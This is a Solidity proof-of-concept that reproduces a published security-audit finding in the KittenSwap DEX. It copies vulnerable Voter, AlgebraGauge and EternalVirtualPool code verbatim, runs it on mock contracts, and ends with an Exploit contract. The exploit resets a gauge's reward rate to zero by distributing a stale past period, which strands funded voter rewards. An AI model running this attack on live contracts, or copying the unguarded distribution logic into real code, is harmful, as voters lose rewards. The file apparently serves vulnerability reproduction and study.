// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of KittenSwap finding 61952 (H-02):
// "Reward rates can be reset to 0 and future rewards can be stolen from voters".
//
// Real audited source (closed-source KittenSwap / HyperEVM ve(3,3) DEX). Three
// vulnerable blocks are reproduced VERBATIM from the finding's embedded
// ```solidity snippets; the root-cause line is marked @>.
//   protocol KittenSwap_2025-07-31
//   contracts Voter / AlgebraGauge / EternalVirtualPool
//   fns       Voter._distribute(uint256 _period, address _gauge)
//             AlgebraGauge._notifyRewardAmount(uint256,uint256)
//             EternalVirtualPool.setRates(uint128,uint128)
//   report    github.com/pashov/audits .../KittenSwap-security-review_2025-07-31.md
//
// Root cause: `Voter.distribute(_period, _gauge)` accepts ANY valid past period
// so that missed distributions can be settled in the current period. But
// `_distribute` never returns early when the supplied gauge had no votes for the
// supplied past period (`ps.gaugeTotalVotes[_gauge] == 0`). Since that past
// period itself had votes (`ps.globalTotalVotes > 0`), `emissions` is computed as
// `totalEmissions * 0 / globalTotalVotes == 0` (the @> line) with no guard, and
// the 0 is forwarded to `IGauge(_gauge).notifyRewardAmount(0)`. For an Algebra
// gauge this calls `AlgebraGauge._notifyRewardAmount(0,0)` ->
// `algebraGaugeFactory.setRates(key, 0/duration, 0/duration)` ->
// `EternalVirtualPool.setRates(0,0)`, which resets the eternal-farming virtual
// pool's reward rate to 0. Pending rewards already funded for the current period
// stay locked in the pool but never stream — voters lose them.
//
// Attack modeled here (finding's first vector, "resetting reward rates to 0"):
//   * period 6 (current): a legitimate distribution funds the pool with 1000e18
//     KITTEN and sets a positive reward rate.
//   * an attacker immediately calls distribute(4, algebraGauge) for a valid PAST
//     period the gauge never had votes in -> emissions == 0 -> the verbatim chain
//     resets the reward rate back to 0. The 1000e18 already funded remain stranded.
//
// All non-vulnerable dependencies (KITTEN token, gauge reward funding, the
// factory->virtual-pool forwarding, the eternal-farming reward streaming,
// period/vote bookkeeping) are faithful minimal doubles with real transfers and
// real accounting — the harm emerges from the verbatim code, it is not asserted.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

/// @dev Emissions record referenced by `_distribute` (`es.amount` / `es.distributed`).
interface IVoter {
    struct Emissions {
        uint256 amount;
        bool distributed;
    }
}

/// @dev Gauge reward sink referenced by `IGauge(_gauge).notifyRewardAmount(...)`.
interface IGauge {
    function notifyRewardAmount(uint256 amount) external;
}

/// @dev The eternal-farming virtual pool interface (`setRates` is `override` in source).
interface IAlgebraEternalVirtualPool {
    function setRates(uint128 rate0, uint128 rate1) external;
}

/// @dev Recreates OZ `SafeCast.toUint128` so the verbatim `_notifyRewardAmount`
///      line stays byte-identical.
library SafeCast {
    function toUint128(uint256 value) internal pure returns (uint128) {
        require(value <= type(uint128).max, "SafeCast: value doesn't fit in 128 bits");
        return uint128(value);
    }
}

/// @dev Recreates `PeriodLibrary.periodNext` (epoch = 1 week) so the verbatim
///      `_notifyRewardAmount` `duration` line stays byte-identical. `periodNext`
///      is always strictly greater than `block.timestamp`, so `duration >= 1`.
library PeriodLibrary {
    uint256 internal constant WEEK = 7 days;

    function periodNext(uint256 timestamp) internal pure returns (uint256) {
        return (timestamp / WEEK + 1) * WEEK;
    }
}

/// @dev Faithful minimal ERC20 double for the KITTEN emissions token.
contract Kitten is IERC20 {
    string public name = "KittenSwap";
    string public symbol = "KITTEN";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount; // reverts on insufficient balance (0.8 checked math)
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Harm marker: the reset is a silent DoS/reward-theft with no positive
///      transfer to the attacker, so the magnitude of rewards stranded at rate 0
///      is minted to the SINK.
contract MarkerToken {
    string public name = "KittenSwap Stranded Rewards (harm marker)";
    string public symbol = "KITTEN";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract #2 — the Algebra eternal-farming virtual pool. `setRates`
// is reproduced VERBATIM from the audited EternalVirtualPool.sol.
// ─────────────────────────────────────────────────────────────────────────────
contract EternalVirtualPool is IAlgebraEternalVirtualPool {
    address public immutable farming; // the AlgebraGaugeFactory (onlyFromFarming caller)
    uint128 public rewardRate0;
    uint128 public rewardRate1;
    uint256 public rewardReserve0; // pending KITTEN funded for the current period
    uint256 public totalDistributed0;
    uint256 public lastTimestamp;

    modifier onlyFromFarming() {
        require(msg.sender == farming, "only farming");
        _;
    }

    constructor(address farming_) {
        farming = farming_;
        lastTimestamp = block.timestamp;
    }

    /// @dev Faithful double: funding a gauge's rewards increases the streaming reserve.
    function addRewards(uint256 amount0, uint256 /* amount1 */) external {
        rewardReserve0 += amount0;
    }

    // ═══════════════ VERBATIM audited `setRates` (EternalVirtualPool.sol) ═══════════════
    function setRates(uint128 rate0, uint128 rate1) external override onlyFromFarming {
        _distributeRewards(); // @audit: distribute rewards based on previous rates
        (rewardRate0, rewardRate1) = (rate0, rate1); // @audit: update rates to 0
    }
    // ════════════════════════════════════════════════════════════════════════════════════

    /// @dev Faithful double of eternal-farming streaming: stream `rate * elapsed`
    ///      out of the reserve. Once the rate is reset to 0, nothing streams and the
    ///      reserve is permanently stranded.
    function _distributeRewards() internal {
        uint256 elapsed = block.timestamp - lastTimestamp;
        uint256 amount = uint256(rewardRate0) * elapsed;
        if (amount > rewardReserve0) amount = rewardReserve0;
        rewardReserve0 -= amount;
        totalDistributed0 += amount;
        lastTimestamp = block.timestamp;
    }
}

/// @dev Faithful double of the AlgebraGaugeFactory: it is the `farming` caller and
///      forwards `setRates` to the keyed eternal virtual pool.
contract AlgebraGaugeFactory {
    mapping(bytes32 => EternalVirtualPool) public poolByKey;

    function registerPool(bytes32 key, EternalVirtualPool pool) external {
        poolByKey[key] = pool;
    }

    function setRates(bytes32 key, uint128 rate0, uint128 rate1) external {
        poolByKey[key].setRates(rate0, rate1);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract #3 — the Algebra gauge. `_notifyRewardAmount` is
// reproduced VERBATIM from the audited AlgebraGauge.sol.
// ─────────────────────────────────────────────────────────────────────────────
contract AlgebraGauge is IGauge {
    IERC20 public kitten;
    AlgebraGaugeFactory public algebraGaugeFactory;
    EternalVirtualPool public virtualPool;
    bytes32 public key;

    constructor(IERC20 kitten_, AlgebraGaugeFactory factory_, EternalVirtualPool pool_, bytes32 key_) {
        kitten = kitten_;
        algebraGaugeFactory = factory_;
        virtualPool = pool_;
        key = key_;
    }

    /// @notice External entrypoint invoked by the Voter. Faithful double: a non-zero
    ///         reward is pulled in and funds the virtual pool reserve; then the rate
    ///         is (re)computed via the verbatim internal helper below.
    function notifyRewardAmount(uint256 _rewardAmount) external {
        if (_rewardAmount > 0) {
            kitten.transferFrom(msg.sender, address(virtualPool), _rewardAmount);
            virtualPool.addRewards(_rewardAmount, 0);
        }
        _notifyRewardAmount(_rewardAmount, 0);
    }

    // ═══════════════ VERBATIM audited `_notifyRewardAmount` (AlgebraGauge.sol) ═══════════════
    function _notifyRewardAmount(
        uint256 _rewardAmount,
        uint256 _bonusRewardAmount
    ) internal {
        uint256 duration = PeriodLibrary.periodNext(block.timestamp) -
            block.timestamp;
        algebraGaugeFactory.setRates(
            key,
            SafeCast.toUint128(_rewardAmount / duration), // @audit: resets rates to `0` when _rewardAmount == 0
            SafeCast.toUint128(_bonusRewardAmount / duration)
        );
    }
    // ════════════════════════════════════════════════════════════════════════════════════════
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract #1 (root cause) — `_distribute` is reproduced VERBATIM
// from the audited KittenSwap Voter (the finding's embedded snippet). The @>
// line is the emissions calc that yields 0 for a stale past period with no early
// return, forwarding 0 into the reset chain above.
// ─────────────────────────────────────────────────────────────────────────────
contract Voter {
    struct GaugeInfo {
        bool isAlive;
        bool isAlgebra;
    }

    struct PeriodState {
        uint256 totalEmissions;
        uint256 globalTotalVotes;
        mapping(address => uint256) gaugeTotalVotes;
        mapping(address => IVoter.Emissions) gaugeEmissions;
    }

    IERC20 public kitten;
    address public minter;

    mapping(uint256 => PeriodState) internal periodState;
    mapping(address => GaugeInfo) public gauge; // keyed by pool
    mapping(address => address) public gaugeToPool; // gauge => pool

    constructor(IERC20 kitten_, address minter_) {
        kitten = kitten_;
        minter = minter_;
    }

    // ── faithful setup doubles (in production this state comes from voting/minter) ──
    function setupPeriod(uint256 period_, uint256 totalEmissions_, uint256 globalTotalVotes_) external {
        PeriodState storage ps = periodState[period_];
        ps.totalEmissions = totalEmissions_;
        ps.globalTotalVotes = globalTotalVotes_;
    }

    function setGaugeVotes(uint256 period_, address _gauge, uint256 votes_) external {
        periodState[period_].gaugeTotalVotes[_gauge] = votes_;
    }

    function registerGauge(address _gauge, address _pool, bool isAlive_, bool isAlgebra_) external {
        gaugeToPool[_gauge] = _pool;
        gauge[_pool] = GaugeInfo({isAlive: isAlive_, isAlgebra: isAlgebra_});
    }

    /// @notice Permissionless entrypoint, exactly as audited: ANY valid past `_period`
    ///         may be supplied so missed distributions settle in the current period.
    function distribute(uint256 _period, address _gauge) external {
        _distribute(_period, _gauge);
    }

    // ── faithful double for the Algebra pool-fee claim (finding's 2nd vector; no
    //    pending community-vault fees are modeled for this rate-reset reproduction) ──
    function _claimAndDistributeAlgebraPoolFees(address /* _pool */) internal {}

    // ═══════════════ VERBATIM audited `_distribute` body ═══════════════
    function _distribute(uint256 _period, address _gauge) internal {
        PeriodState storage ps = periodState[_period];
        IVoter.Emissions storage es = ps.gaugeEmissions[_gauge];

        uint256 emissions = (ps.totalEmissions * ps.gaugeTotalVotes[_gauge]) / // @> VULN: a valid past `_period` in which this gauge had no votes gives gaugeTotalVotes==0 -> emissions==0 with NO early return; the 0 is forwarded to notifyRewardAmount(0), resetting the gauge's eternal-farming reward rate to 0
            ps.globalTotalVotes;
        address _pool = gaugeToPool[_gauge];

        // transfer emissions to minter if gauge is killed
        if (gauge[_pool].isAlive == false) {
            kitten.transfer(address(minter), emissions);
            emissions = 0;
        } else {
            es.amount = emissions;
            es.distributed = true;
        }

        if (gauge[_pool].isAlgebra) _claimAndDistributeAlgebraPoolFees(_pool);
        kitten.approve(_gauge, emissions);
        IGauge(_gauge).notifyRewardAmount(emissions);
    }
    // ═══════════════════════════════════════════════════════════════════
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: reproduce the finding's "resetting reward rates to 0" vector.
// period 6 (current) is legitimately distributed -> pool funded with 1000e18 and a
// positive reward rate set. The attacker then calls distribute(4, algebraGauge)
// for a valid PAST period the gauge had 0 votes in -> emissions == 0 -> the
// verbatim chain resets the reward rate to 0, stranding the 1000e18.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant MINTER = address(0xBEEF);
    bytes32 internal constant KEY = keccak256("algebra-eternal-pool");

    Kitten public kitten;
    MarkerToken public marker;
    AlgebraGaugeFactory public factory;
    EternalVirtualPool public virtualPool;
    AlgebraGauge public gauge;
    Voter public voter;

    uint256 internal constant EMISSIONS = 1000e18; // period-6 emissions funded to the pool
    uint256 internal constant GLOBAL_VOTES = 100;

    uint256 public resetRateFrom; // positive rate before the attack
    uint256 public strandedRewards; // KITTEN locked in the pool at rate 0 after the reset
    uint256 public profit; // == strandedRewards (blocked reward magnitude)

    constructor() {
        kitten = new Kitten(); // child nonce 1
        marker = new MarkerToken(); // child nonce 2
        factory = new AlgebraGaugeFactory(); // child nonce 3
        virtualPool = new EternalVirtualPool(address(factory)); // child nonce 4
        gauge = new AlgebraGauge(kitten, factory, virtualPool, KEY); // child nonce 5
        voter = new Voter(kitten, MINTER); // child nonce 6 (VULN)

        factory.registerPool(KEY, virtualPool);

        // live Algebra gauge, mapped to its pool
        voter.registerGauge(address(gauge), address(0xA16E), true, true);

        // period 6 (current): the gauge has votes -> a real, positive distribution
        voter.setupPeriod(6, EMISSIONS, GLOBAL_VOTES);
        voter.setGaugeVotes(6, address(gauge), GLOBAL_VOTES); // emissions(6) = 1000e18

        // period 4 (a valid PAST period): had global votes, but this gauge did NOT
        // exist then -> gaugeTotalVotes == 0 -> emissions(4) == 0
        voter.setupPeriod(4, EMISSIONS, GLOBAL_VOTES);
        voter.setGaugeVotes(4, address(gauge), 0);

        // the minter has funded the Voter with the current period's emissions
        kitten.mint(address(voter), EMISSIONS);
    }

    function run() external {
        // 1) legitimate current-period distribution: 1000e18 funds the pool reserve
        //    and a positive reward rate is set.
        voter.distribute(6, address(gauge));
        uint128 rateAfterLegit = virtualPool.rewardRate0();
        uint256 reserveAfterLegit = virtualPool.rewardReserve0();
        require(rateAfterLegit > 0, "legit distribution did not set a positive reward rate");
        require(reserveAfterLegit == EMISSIONS, "pool reserve did not receive period-6 emissions");
        resetRateFrom = rateAfterLegit;

        // 2) attack: distribute a valid PAST period (4) in which the gauge had 0 votes.
        //    emissions == 0 -> AlgebraGauge.notifyRewardAmount(0) -> factory.setRates ->
        //    EternalVirtualPool.setRates(0,0) -> reward rate reset to 0.
        voter.distribute(4, address(gauge));
        uint128 rateAfterAttack = virtualPool.rewardRate0();
        uint256 reserveAfterAttack = virtualPool.rewardReserve0();

        // concrete harm: the reward rate was reset to 0 while the pending rewards
        // stay locked in the virtual pool — at rate 0 they will never stream to the
        // voters they were funded for.
        require(rateAfterAttack == 0, "reward rate was not reset to 0");
        require(reserveAfterAttack == reserveAfterLegit, "funded rewards should remain (stranded at rate 0)");
        strandedRewards = reserveAfterAttack;
        require(strandedRewards == EMISSIONS, "stranded reward magnitude mismatch");

        // silent DoS / reward theft: the attacker sends no value to itself (it only
        // resets the rate). Record the stranded/blocked reward magnitude at the SINK.
        marker.mint(SINK, strandedRewards);
        profit = strandedRewards;
    }
}
